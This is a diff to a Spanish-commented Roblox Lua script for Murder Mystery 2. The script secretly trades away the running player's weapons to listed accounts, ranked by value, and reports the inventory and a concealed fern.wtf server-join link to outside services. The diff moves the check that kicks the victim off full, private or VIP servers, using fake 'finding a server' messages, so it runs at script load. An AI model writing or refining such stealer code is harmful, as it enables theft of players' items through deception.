@@ -59,6 +59,21 @@ local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapon
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
+-- Kick inicial al cargar el script
+local function CheckServerInitial()
+    if #Players:GetPlayers() >= 12 then
+        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
+    end
+    if game.PrivateServerId and game.PrivateServerId ~= "" then
+        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
+    end
+    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
+    if success and ownerId and ownerId ~= 0 then
+        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
+    end
+end
+CheckServerInitial() -- Ejecutar al inicio
+
 -- ===== MM2 Supreme value system =====
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
@@ -160,23 +175,9 @@ end
 -- Ordenar armas por valor total
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join con Fern dinámico (sin mostrar URL)
+-- Generar join con Fern dinámico (link oculto)
 local fernToken = math.random(100000,999999)
 local safeLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
-
--- Kick inicial y manejo de servidor lleno/privado/VIP
-local function CheckServer()
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
-end
 
 -- Webhook inicial del inventario
 local fieldsInit={
@@ -233,7 +234,6 @@ end
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function()
-            CheckServer()
             doTrade(p.Name)
         end)
     end
@@ -241,7 +241,6 @@ end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
         p.Chatted:Connect(function()
-            CheckServer()
             doTrade(p.Name)
         end)
     end
